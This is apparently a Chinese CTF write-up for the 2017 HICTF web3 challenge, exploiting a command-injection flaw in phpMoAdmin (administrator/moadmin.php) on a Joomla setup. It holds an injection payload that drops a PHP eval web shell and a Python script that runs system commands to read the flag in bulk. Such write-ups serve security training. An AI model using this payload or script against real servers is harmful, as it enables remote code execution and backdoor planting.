## 环境构建
```
docker-compose build
docker-compose up -d
```

## 漏洞介绍
本题目是2017年HICTF的四个web题目中的web3，利用的漏洞不是joomla自身存在的漏洞，利用的是phpmoadmin的命令执行漏洞,漏洞文件在administrator/moadmin.php

## 漏洞利用

### PHP探针

()[luffy1.png]


### PHP getshell

`
bject=1;file_put_contents("shadow.php", "<?php eval(\$_POST[dji]) ?>");
`
()[luffy2.png]

验证
()[luffy3.png]


### 批量getflag

`
#!/usr/bin/env python
# encoding:utf-8

'''
Get flag by RCE of moadmin
'''

import requests

def get_flag(host, port):
    url = 'http://%s:%d/administrator/moadmin.php' % (host, port)
    data = {'object':'1;system("cat /opt/flag/flag.txt");'}
    response = requests.post(url, data=data)
    content = response.content
    flag = content.replace("\n", "").replace(" ","")
    print flag
    return flag

def main():
    get_flag("192.168.30.36", 12343)

if __name__ == '__main__':
    main()
`

